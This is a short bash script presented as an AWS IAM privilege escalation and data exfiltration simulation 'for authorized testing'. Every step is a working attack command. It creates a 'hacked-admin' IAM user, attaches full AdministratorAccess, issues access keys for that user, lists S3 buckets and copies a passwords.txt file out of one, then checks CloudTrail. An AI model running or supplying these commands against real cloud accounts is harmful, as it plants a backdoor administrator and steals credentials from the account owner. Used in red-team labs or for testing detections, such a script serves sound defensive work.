#!/bin/bash
# ------------------------------------------------------------------
# AWS IAM Privilege Escalation & Exfiltration Simulation Script
# Note: For educational and authorized testing environments only.
# ------------------------------------------------------------------

echo "Step 1: Verifying Current Identity..."
aws sts get-caller-identity

echo "Step 2: Executing Privilege Escalation..."
aws iam create-user --user-name hacked-admin
aws iam attach-user-policy --user-name hacked-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name hacked-admin

echo "Waiting 10 seconds for IAM global propagation..."
sleep 10

echo "Step 3: Executing Data Exfiltration..."
aws s3 ls
aws s3 ls s3://proj2-data-leak
aws s3 cp s3://proj2-data-leak/passwords.txt .

echo "Step 4: Verifying Audit Trail..."
aws cloudtrail lookup-events --max-results 10